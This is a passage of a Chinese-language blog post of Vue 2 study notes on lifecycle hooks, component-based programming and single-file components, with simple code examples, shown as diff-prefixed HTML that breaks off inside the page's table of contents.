+<li><p>備註：</p>
+<ol>
+<li>指令定義時不加<code>v-</code>，但使用時要加<code>v-</code>:</li>
+<li>指令名如果是多個單詞，要使用 kebab-case 命名方式，不要用 camelCase 命名方式</li>
+</ol>
+</li>
+</ol>
+<h2 id="生命週期"><a href="#生命週期" class="headerlink" title="生命週期"></a>生命週期</h2><ol>
+<li>簡介：<ul>
+<li>Vue在關鍵時刻幫我們調用的一些特殊名稱的函數</li>
+<li>生命週期函數的名字不可更改，但函數的具體內容是程序員根據要求編寫的</li>
+<li>生命週期函數中的<code>this</code>指向是<code>vm</code>或組件實例對象</li>
+<li>生命週期：<code>beforeCreate</code> -&gt; <code>created</code> -&gt; <code>beforeMount</code>  -&gt; <code>mounted</code>  -&gt; <code>beforeUpdated</code>  -&gt; <code>updated</code>  -&gt; <code>beforeDestoryed</code>  -&gt; <code>destoryed</code></li>
+<li>圖示：<br><img src="https://p.ipic.vip/jmyx89.png" width="600px"/></li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p>分析聲明週期：</p>
+<ol>
+<li><p><code>beforeCreate()</code></p>
+<ul>
+<li>初始化：生命週期、事件</li>
+<li>無法通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
+</ul>
+</li>
+<li><p><code>created()</code></p>
+<ul>
+<li>初始化：數據監聽、數據代理</li>
+<li>可以通過<code>vm</code>訪問<code>data</code>中的數據和<code>methods</code>中的方法</li>
+</ul>
+</li>
+<li><p><code>beforeMount()</code></p>
+<ul>
+<li>解析模板，生成虛擬DOM，此時頁面還<font color="#f54747">不能顯示解析好的內容</font></li>
+<li>頁面呈現的是<font color="#f54747">未經Vue編譯的DOM結構</font></li>
+<li>所有對DOM的操作，最終都沒有效果</li>
+</ul>
+</li>
+<li><p><code>mounted()</code></p>
+<ul>
+<li>將內存中的 虛擬DOM 轉為 真實DOM 插入頁面</li>
+<li>頁面呈現的是<font color="#f54747">經過Vue編譯的DOM結構</font></li>
+<li>一般在此進行：開始定時器、發送網絡請求、綁定自定義事件等初始化操作</li>
+</ul>
+</li>
+<li><p><code>beforeUpdate()</code></p>
+<ul>
+<li>此時數據是新的，但是頁面是舊的，<font color="#f54747">數據和頁面尚未保持同步</font></li>
+</ul>
+</li>
+<li><p><code>updated()</code></p>
+<ul>
+<li>根據新數據生成新的虛擬DOM，隨後與舊的虛擬DOM進行<code>diff</code>算法比較，最終更新頁面</li>
+<li>此時數據和頁面都是新的，<font color="#f54747">數據和頁面同步</font></li>
+</ul>
+</li>
+<li><p><code>beforeDestroyed()</code></p>
+<ul>
+<li>此時<code>vm</code>中的所有<code>data</code>、<code>methods</code>都是可用的，但<font color="#f54747">不會進行頁面的更新</font></li>
+<li>一般在此進行：關閉定時器等收尾操作</li>
+</ul>
+</li>
+<li><p><code>destroyed()</code></p>
+<ul>
+<li>刪除所有內置的數據監聽和數據代理</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>常用生命週期鉤子：<ol>
+<li><code>mounted()</code> <ul>
+<li>發送<code>ajax</code>請求、啟動定時器、綁定自定義事件、訂閱消息等<font color="#f54747">初始化操作</font></li>
+</ul>
+</li>
+<li><code>beforeDestroy()</code><ul>
+<li>清除定時器、解綁自定義事件、取消訂閱信息等<font color="#f54747">收尾工作</font></li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>關於銷毀Vue實例：<ol>
+<li>銷毀後借助Vue的開發者工具看不到任何信息</li>
+<li>銷毀後自定義事件會失效，但<font color="#f54747">原生DOM事件依然有效</font></li>
+<li>一般不會在<code>beforeDestroy</code>操作數據，因為即便操作數據，也不會觸發更新流程</li>
+</ol>
+</li>
+</ol>
+<h2 id="組件化編程"><a href="#組件化編程" class="headerlink" title="組件化編程"></a>組件化編程</h2><ol>
+<li><p>傳統方式編寫應用：</p>
+<ol>
+<li><p>案例一、頂部、導航、內容、底部</p>
+<ul>
+<li>結構：<ul>
+<li>1個HTML，負責頁面結構</li>
+<li>添加引入4個CSS，負責管理不同區域</li>
+<li>添加引入4個JS，負責各個區域的交互</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>案例二、頂部、商品列表、底部</p>
+<ul>
+<li>結構：<ul>
+<li>1個新的HTML，「複製貼上」案例一中 頂部與底部的結構，並添加商品列表的結構</li>
+<li>引入案例一中重複的頂部與底部CSS樣式</li>
+<li>引入案例一中重複的頂部與底部JS</li>
+<li>添加引入1個CSS樣式和JS交互，負責商品列表區域</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>存在問題：</p>
+<ol>
+<li>依賴關係混亂、不好維護</li>
+<li>代碼複用率不高</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>組件方式編寫應用：</p>
+<ol>
+<li><p>案例一、頂部、導航、內容、底部</p>
+<ul>
+<li>分開四個不同組件：<ul>
+<li><code>header</code>組件，包含：實現頂部功能所對應的樣式(CSS)、結構(HTML片斷)及交互(JS)</li>
+<li><code>navigator</code>組件</li>
+<li><code>content</code>組件</li>
+<li><code>footer</code>組件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>案例二、頂部、商品列表、底部</p>
+<ul>
+<li>把重複應用的組件引入</li>
+<li>再新增<code>list</code>組件，裏面包含實現其功能的樣式、結構及交互，並且包含獨特的，如字體、音頻等</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>組件化編程思路：</p>
+<ol>
+<li><p>拆分靜態組件：組件按照<font color="#f54747">功能點</font>拆分，命名不要與html元素衝突</p>
+</li>
+<li><p>實現動態組件：考慮好數據存放的位置，數據是一個組件在用，還是一些組件在用：</p>
+<ul>
+<li>一個組件在用：放在組件自身即可</li>
+<li>多個組件在用：放在他們共同父組件上（狀態提升）</li>
+</ul>
+</li>
+<li><p>實現交互：從綁定事件開始</p>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>組件與模塊：</p>
+<ol>
+<li><p>模塊</p>
+<ul>
+<li>定義：向外提供特定功能的JS程序</li>
+<li>原因：JS文件很多很複雜</li>
+<li>作用：複用JS、簡化JS編程，提高JS運行效率</li>
+</ul>
+</li>
+<li><p>組件</p>
+<ul>
+<li>定義：實現應用中<font color="#f54747">局部功能代碼和資源的集合</font></li>
+<li>原因：一個界面的功能很複雜</li>
+<li>作用：複寫編碼、簡化項目編碼，提高運行效率</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>組件化與模塊化</p>
+<ol>
+<li><p>模塊化</p>
+<ul>
+<li>當應用中的JS以模塊化形式編寫的，那這個應用就是一個模塊化的應用（把JS按模塊化的標準拆分）</li>
+</ul>
+</li>
+<li><p>組件化</p>
+<ul>
+<li>當應用中的功能都是多組件的方式來編寫的，那這個應用就是一個組件化的應用（按照不同功能點來拆分）</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="非單文件組件"><a href="#非單文件組件" class="headerlink" title="非單文件組件"></a>非單文件組件</h2><ol>
+<li><p>Vue中使用組件的三大步驟：</p>
+<ol>
+<li><p>定義一個組件：</p>
+<ul>
+<li>使用<code>Vue.extend(options)</code>創建<ul>
+<li><code>options</code>和<code>new Vue(options)</code>時傳入的那個<code>options</code>幾乎一樣</li>
+<li>區別：<ol>
+<li><code>el</code>不要寫，因為最終所有組件都要經過一個<code>vm</code>管理，由<code>vm</code>中的<code>el</code>決定服務哪個容器</li>
+<li><code>data</code>必須寫成函數<code>data()&#123;return&#123;&#125;&#125;</code>，避免組件被複用時數據存在引用關係（儲存為同一地址）</li>
+</ol>
+</li>
+<li>備註：使用<code>template</code>可以配置組件結構<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Name: &#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Student Address: &#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">studentName</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">19</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>註冊組件：</p>
+<ol>
+<li><p>局部註冊：靠<code>new Vue</code>的時候傳入<code>components</code>選項</p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>全局註冊：靠<code>Vue.component(&#39;組件名&#39;, 組件)</code></p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;school&#x27;</span>, school)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p>使用組件（組件標籤）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;組件名&gt;&lt;/組件名&gt;</span><br><span class="line">&lt;school&gt;&lt;/school&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>使用組件注意事項</p>
+<ol>
+<li><p>組件命名方式：</p>
+<ol>
+<li><p>一個單詞組成：</p>
+<ul>
+<li>第一種寫法：首字母大寫<code>School</code></li>
+<li>第二種寫法：首字母小寫<code>school</code></li>
+</ul>
+</li>
+<li><p>多個單詞組成：</p>
+<ul>
+<li>第一種寫法：kebab-case命名<code>my-school</code></li>
+<li>第二種寫法：CamelCase命名<code>MySchool</code>（需要Vue腳手架支持）</li>
+</ul>
+</li>
+<li><p>備註：</p>
+<ul>
+<li>組件名儘可能迴避HTML中已有的元素名稱，例如<code>h2</code>、<code>H2</code></li>
+<li>可以使用<code>name</code>配置項指定組件在開發者工具中呈現的名字</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>2. 組件標籤寫法：
+    a. `&lt;school&gt;&lt;/school&gt;`
+    b. `&lt;school/&gt;`    (不使用腳手架時，`&lt;school/&gt;`標籤會導致後續組件不能渲染)
+
+
+
+3. 簡寫方式：
+    `const school = Vue.extend(options)`可簡寫為`const school = options`
+    <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Name: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;School Address: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            <span class="attr">schoolName</span>:<span class="string">&#x27;CUHK&#x27;</span>,</span><br><span class="line">            <span class="attr">address</span>:<span class="string">&#x27;Tai Po&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</code></pre><ol>
+<li>組件嵌套<ul>
+<li>在組件內傳入<code>components</code>選項  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義 student 組件</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;Student&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 school 組件</span></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;student&gt;&lt;/student&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        student</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定義 app 組件</span></span><br><span class="line"><span class="keyword">const</span> app = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        school,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app&gt;&lt;/app&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="comment">// 註冊組件(局部)</span></span><br><span class="line">    <span class="attr">components</span>:&#123;app&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><code>VueComponent</code></p>
+<ol>
+<li><p><code>school</code>組件本質是一個名為<code>VueComponent</code>的<font color="#f54747">構造函數</font>，且不是程序員定義的，是<code>Vue.extend</code>生成的</p>
+</li>
+<li><p>我們只需要寫<code>&lt;school&gt;&lt;/school&gt;</code>，Vue解析時會幫我們創建<code>school</code>組件的實例對象</p>
+<ul>
+<li>即Vue會幫我們執行：<code>new VueComponent(options)</code></li>
+</ul>
+</li>
+<li><p>特別注意：<font color="#f54747">每次調用<code>Vue.extend</code>時，返回的都是一個全新的<code>VueComponent</code>！！！</font></p>
+</li>
+<li><p><code>this</code>指向：</p>
+<ul>
+<li><p>組件配置中：</p>
+<ul>
+<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">VueComponent實例對象</font></li>
+</ul>
+</li>
+<li><p><code>new Vue(options)</code>配置中：</p>
+<ul>
+<li><code>data</code>函數、<code>methods</code>中的函數、<code>watch</code>中的函數、<code>computed</code>中的函數<br>  他們的<code>this</code>都是<font color="#f54747">Vue實例對象 === vm</font></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>VueComponent</code>的實例對象，簡稱<code>vc</code>。Vue的實例對象，簡稱<code>vm</code></p>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>內置關係：<ul>
+<li>一個重要的內置關係：<code>VueComponent.prototype.__proto__ === Vue.prototype</code></li>
+<li>原因：讓組件實例對象(vc)，也能訪問到Vue原型上的屬性和方法</li>
+</ul>
+</li>
+</ol>
+<h2 id="單文件組件"><a href="#單文件組件" class="headerlink" title="單文件組件"></a>單文件組件</h2><ol>
+<li>創建<code>index.html</code>文件 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入Vue.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入入口文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>配置<code>main.js</code>入口文件 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`&lt;App&gt;&lt;/App&gt;`</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;<span class="title class_">App</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>配置<code>App</code>組件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;School/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 引入組件</span><br><span class="line">    import School from &#x27;./School.vue&#x27;</span><br><span class="line"></span><br><span class="line">    // 暴露App組件</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;App&#x27;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            School,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>配置<code>School</code>組件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 組件的結構 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">        &lt;h2&gt;School Name: &#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;Show Name&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件交互相關的代碼 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;School&#x27;,</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                name:&#x27;CUHK&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            showName()&#123;</span><br><span class="line">                alert(this.name)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 組件的樣式 --&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>注意：此時開啟<code>index.html</code>文件頁面沒有任何小效果，因為沒有配置Vue腳手架</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://github.com/DonaldLamNL/myBlog">Donald Lam</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://github.com/DonaldLamNL/myBlog/2022/06/08/WebsiteDevelopment/VueJS/2022-6-8-Vue2JS-Basic/">https://github.com/DonaldLamNL/myBlog/2022/06/08/WebsiteDevelopment/VueJS/2022-6-8-Vue2JS-Basic/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/myBlog/tags/VueJS/">VueJS</a></div><div class="post_share"><div class="social-share" data-image="https://p.ipic.vip/6a7ugr.webp" data-sites="facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/myBlog/2022/06/19/WebsiteDevelopment/VueJS/2022-6-19-VueJS-cli/"><img class="prev-cover" src="https://p.ipic.vip/6a7ugr.webp" onerror="onerror=null;src='/myBlog/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">VueJS - Vue CLI</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/myBlog/2022/08/20/WebsiteDevelopment/BackEnd/2022-8-20-PS-ImagesGradient/" title="VueJS Implement - Images Gradient"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-20</div><div class="title">VueJS Implement - Images Gradient</div></div></a></div><div><a href="/myBlog/2022/08/24/WebsiteDevelopment/BackEnd/2022-8-24-PS-EasyCircularProgress/" title="VueJS Dependency - Easy-Circular-Progress"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-24</div><div class="title">VueJS Dependency - Easy-Circular-Progress</div></div></a></div><div><a href="/myBlog/2022/08/23/WebsiteDevelopment/BackEnd/2022-8-23-PS-AnimationOnscroll/" title="VueJS Dependency - Vue-Animate-Onscroll"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-23</div><div class="title">VueJS Dependency - Vue-Animate-Onscroll</div></div></a></div><div><a href="/myBlog/2022/08/23/WebsiteDevelopment/Development/2022-8-23-PS-AnimationOnscroll/" title="VueJS Dependency - Vue-Animate-Onscroll"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-23</div><div class="title">VueJS Dependency - Vue-Animate-Onscroll</div></div></a></div><div><a href="/myBlog/2022/08/20/WebsiteDevelopment/Development/2022-8-20-PS-ImagesGradient/" title="VueJS Implement - Images Gradient"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-20</div><div class="title">VueJS Implement - Images Gradient</div></div></a></div><div><a href="/myBlog/2022/08/24/WebsiteDevelopment/Development/2022-8-24-PS-EasyCircularProgress/" title="VueJS Dependency - Easy-Circular-Progress"><img class="cover" src="https://p.ipic.vip/6a7ugr.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-24</div><div class="title">VueJS Dependency - Easy-Circular-Progress</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://p.ipic.vip/5dc8z2.jpeg" onerror="this.onerror=null;this.src='/myBlog/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Donald Lam</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/myBlog/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/myBlog/tags/"><div class="headline">Tags</div><div class="length-num">13</div></a><a href="/myBlog/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://donaldlamnl.github.io/myWeb/#/home"><i></i><span>My Personal Website</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DonaldLamNL" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:manholam8@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vue2-Basic"><span class="toc-number">1.</span> <span class="toc-text">Vue2 Basic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vue%E7%B0%A1%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Vue簡介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vue%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.</span> <span class="toc-text">Vue操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%A1%8A%E8%AA%9E%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">模塊語法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B8%E6%93%9A%E7%B6%81%E5%AE%9A"><span class="toc-number">1.4.</span> <span class="toc-text">數據綁定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#el%E5%92%8Cdata%E5%AF%AB%E6%B3%95"><span class="toc-number">1.5.</span> <span 